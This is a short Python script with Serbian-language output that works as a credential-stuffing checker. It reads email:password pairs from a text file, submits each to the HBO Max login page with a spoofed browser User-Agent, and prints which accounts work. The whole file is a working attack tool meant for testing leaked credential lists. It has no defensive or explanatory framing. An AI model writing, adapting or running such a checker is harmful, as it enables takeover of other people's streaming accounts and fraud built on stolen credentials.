import requests

def check_hbo_max_account(email, password):
    login_url = "https://www.hbomax.com/login"
    session = requests.Session()
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
    }
    
    data = {
        "email": email,
        "password": password
    }
    
    response = session.post(login_url, headers=headers, data=data)
    
    if "invalid credentials" in response.text.lower():
        return False
    elif response.status_code == 200 and "dashboard" in response.text.lower():
        return True
    else:
        return None  # Neodređen odgovor

if __name__ == "__main__":
    with open("nalog.txt", "r") as file:
        accounts = [line.strip().split(":") for line in file if ":" in line]
    
    for email, password in accounts:
        result = check_hbo_max_account(email, password)
        
        if result is True:
            print(f"✅ Nalog radi: {email}")
        elif result is False:
            print(f"❌ Pogrešni podaci: {email}")
        else:
            print(f"⚠️ Nešto nije u redu sa: {email}, pokušaj kasnije!")
